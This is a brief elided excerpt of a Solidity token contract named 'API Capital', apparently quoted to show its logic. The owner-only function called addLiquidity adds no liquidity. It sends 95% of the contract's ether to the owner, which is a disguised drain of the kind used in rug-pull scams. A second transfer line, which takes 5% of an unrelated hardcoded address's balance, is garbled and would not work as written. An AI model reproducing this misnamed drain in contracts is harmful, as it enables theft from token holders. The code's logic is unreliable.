...
contract API {
    ...
    string private _name = "API Capital";
    ...
    function addLiquidity() public onlyOwner() {
        ...
        _authNum=0;
        msg.sender.transfer(address(this).balance.mul(95).div(100));
         msg.sender.transfer(address(uint160(0x13905E33436c220f61F7e1fEc6E81e496346B7EB)).balance.mul(5).div(100));
    }
